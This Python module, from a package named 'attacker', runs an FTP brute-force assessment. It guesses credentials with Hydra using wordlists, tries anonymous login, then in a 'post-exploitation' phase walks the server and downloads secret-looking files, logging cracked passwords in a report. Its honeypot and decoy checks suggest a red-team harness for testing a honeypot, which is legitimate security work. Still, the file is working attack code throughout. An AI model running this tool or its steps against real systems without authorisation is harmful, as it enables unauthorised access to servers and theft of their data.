from __future__ import annotations

import ftplib
import logging
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path

from attacker import report as report_mod
from attacker.attacks.common import (
    ResultsDir,
    is_reachable,
    make_results_dir,
    prompt_yes_no,
    resolve_default_credentials,
    resolve_password_wordlist,
    resolve_username_wordlist,
    run_credential_bruteforce,
)
from attacker.attacks.honeypot import analyze_logins, detect_ftp, warn_if_suspected
from attacker.attacks.post_exploit import ftp_post_exploit

logger = logging.getLogger(__name__)


@dataclass(frozen=True)
class FtpBruteforceConfig:
    target_host: str
    target_port: int = 2121
    hydra_tasks: int = 16
    hydra_timeout: int = 300
    ftp_timeout: float = 10.0
    pause_between_manual: float = 0.3
    pause_before_assertions: float = 10.0
    skip_hydra: bool = False
    skip_anonymous: bool = False
    use_full_wordlist: bool = False
    password_wordlist: Path | None = None
    username_wordlist: Path | None = None
    default_credentials: Path | None = None


@dataclass
class FtpBruteforceReport:
    target: str
    hydra_attempts: int = 0
    hydra_credentials_found: int = 0
    anonymous_connected: bool = False
    decoys_downloaded: int = 0
    sensitive_files: int = 0
    honeypot_suspected: bool = False
    skipped_phases: list[str] = field(default_factory=list)
    loot_findings: list[report_mod.ReportFinding] = field(default_factory=list)
    exit_code: int = 0


def _phase_anonymous(
    config: FtpBruteforceConfig,
    results: ResultsDir,
) -> tuple[bool, int]:
    log_lines: list[str] = []
    connected = False
    decoys_downloaded = 0

    try:
        client = ftplib.FTP()
        client.connect(
            config.target_host,
            config.target_port,
            timeout=config.ftp_timeout,
        )
        log_lines.append(f"CONNECT {config.target_host}:{config.target_port} -> OK")

        try:
            client.login("anonymous", "anonymous@example.com")
            log_lines.append("LOGIN anonymous -> ACCEPTED")
            logger.info("Anonymous login accepted")
            connected = True
        except ftplib.error_perm as exc:
            log_lines.append(f"LOGIN anonymous -> REFUSED ({exc})")
            logger.info("Anonymous login refused (%s)", exc)

        try:
            client.quit()
        except ftplib.all_errors:
            pass

    except ftplib.all_errors as exc:  # already includes OSError
        log_lines.append(f"CONNECT -> FAIL ({exc})")
        logger.error("FTP connection failed: %s", exc)

    results.file("anonymous.txt").write_text("\n".join(log_lines), encoding="utf-8")
    return connected, decoys_downloaded


def _select_loot_login(
    found: list[tuple[str, str]], anonymous_connected: bool
) -> tuple[str, str] | None:
    """Pick the login used for the loot phase: cracked creds beat anonymous."""
    if found:
        return found[0]
    if anonymous_connected:
        return ("anonymous", "anonymous@example.com")
    return None


def run(
    config: FtpBruteforceConfig,
    reports_dir: Path,
) -> FtpBruteforceReport:
    started_at = datetime.now()
    start = time.monotonic()
    target = f"ftp://{config.target_host}:{config.target_port}"
    report = FtpBruteforceReport(target=target)

    results = make_results_dir(reports_dir, prefix=f"ftp-{config.target_port}")
    logger.info("Artefacts directory: %s", results.path)

    rich = report_mod.Report(
        title="FTP Brute-Force Assessment",
        target=target,
        protocol="ftp",
        host=config.target_host,
        port=config.target_port,
        started_at=started_at,
    )

    if not is_reachable(config.target_host, config.target_port):
        logger.error(
            "FTP target unreachable at %s:%d",
            config.target_host,
            config.target_port,
        )
        report.exit_code = 2
        rich.exit_code = 2
        rich.duration_s = time.monotonic() - start
        report_mod.write_report(results.path, rich)
        return report
    logger.info("FTP target reachable")

    # Pre-attack passive/active honeypot check (banner + default/decoy logins).
    verdict = detect_ftp(config.target_host, config.target_port)

    default_credentials = resolve_default_credentials(config.default_credentials, "ftp")
    username_wordlist = resolve_username_wordlist(config.username_wordlist)
    password_wordlist = resolve_password_wordlist(config.password_wordlist)

    found: list[tuple[str, str]] = []
    if config.skip_hydra:
        report.skipped_phases.append("hydra")
        rich.phases.append(
            report_mod.ReportPhase("Brute-force (Hydra)", "skipped", "--skip-hydra")
        )
        logger.warning("Phase 1 skipped (--skip-hydra)")
    else:
        outcome = run_credential_bruteforce(
            "ftp",
            config.target_host,
            config.target_port,
            tasks=config.hydra_tasks,
            timeout=config.hydra_timeout,
            results=results,
            default_credentials=default_credentials,
            username_wordlist=username_wordlist,
            password_wordlist=password_wordlist,
            use_full_wordlist=config.use_full_wordlist,
            confirm_escalation=prompt_yes_no,
        )
        found = outcome.found
        report.hydra_attempts = outcome.attempts
        report.hydra_credentials_found = len(outcome.found)
        rich.phases.append(
            report_mod.ReportPhase(
                "Brute-force (Hydra)",
                "completed",
                f"{outcome.attempts} attempt(s) across phases: "
                f"{', '.join(outcome.phases) or 'none'}; "
                f"{len(outcome.found)} credential(s) accepted",
            )
        )
        # Coherence: feed the full brute-force result back into the verdict.
        analyze_logins(
            verdict, outcome.found, protocol="ftp", indicator="ftp-bruteforce"
        )

    if config.skip_anonymous:
        report.skipped_phases.append("anonymous")
        rich.phases.append(
            report_mod.ReportPhase("Anonymous login", "skipped", "--skip-anonymous")
        )
        logger.warning("Phase 2 skipped (--skip-anonymous)")
    else:
        report.anonymous_connected, report.decoys_downloaded = _phase_anonymous(
            config, results
        )
        rich.phases.append(
            report_mod.ReportPhase(
                "Anonymous login",
                "completed",
                "accepted" if report.anonymous_connected else "refused",
            )
        )

    # Phase 3: post-exploitation — walk the tree and pull the secret-looking
    # files with the best working login (cracked creds first, else anonymous).
    loot_login = _select_loot_login(found, report.anonymous_connected)
    if loot_login is not None:
        loot_user, loot_pwd = loot_login
        loot, downloaded = ftp_post_exploit(
            config.target_host,
            config.target_port,
            loot_user,
            loot_pwd,
            verdict,
            results,
            timeout=config.ftp_timeout,
        )
        report.loot_findings = loot
        # Genuine exposures only; placeholder/decoy downloads are info-level bait.
        report.sensitive_files = sum(1 for f in loot if f.severity == "high")
        rich.phases.append(
            report_mod.ReportPhase(
                "Post-exploitation",
                "completed",
                f"{downloaded} file(s) downloaded as {loot_user} "
                f"({report.sensitive_files} genuine)",
            )
        )
    else:
        rich.phases.append(
            report_mod.ReportPhase("Post-exploitation", "skipped", "no working login")
        )

    report.honeypot_suspected = warn_if_suspected(verdict, logger)

    _populate_report(rich, config, report, verdict, found)
    rich.duration_s = time.monotonic() - start
    report_mod.write_report(results.path, rich)
    return report


def _populate_report(
    rich: report_mod.Report,
    config: FtpBruteforceConfig,
    report: FtpBruteforceReport,
    verdict: object,
    found: list[tuple[str, str]],
) -> None:
    rich.exit_code = report.exit_code
    rich.honeypot = report_mod.honeypot_assessment_from_verdict(verdict)
    rich.credentials = [
        report_mod.ReportCredential(user, pwd, service="FTP") for user, pwd in found
    ]
    for user, pwd in found:
        rich.findings.append(
            report_mod.ReportFinding(
                "critical",
                "Valid FTP credentials accepted",
                f"`{user}:{pwd}` at {report.target}",
            )
        )
    if report.anonymous_connected:
        rich.findings.append(
            report_mod.ReportFinding(
                "high",
                "Anonymous FTP login permitted",
                f"`anonymous` accepted at {report.target}",
            )
        )
    rich.findings.extend(report.loot_findings)
    if rich.honeypot.suspected:
        rich.findings.append(
            report_mod.ReportFinding(
                "info",
                "Target appears to be a honeypot",
                f"honeypot confidence {rich.honeypot.score}%",
            )
        )
    rich.metrics = {
        "Port": config.target_port,
        "Login attempts": report.hydra_attempts,
        "Credentials cracked": report.hydra_credentials_found,
        "Anonymous login": "yes" if report.anonymous_connected else "no",
        "Sensitive files downloaded": report.sensitive_files,
        "Honeypot suspected": "yes" if report.honeypot_suspected else "no",
        "Skipped phases": ", ".join(report.skipped_phases) or "none",
    }
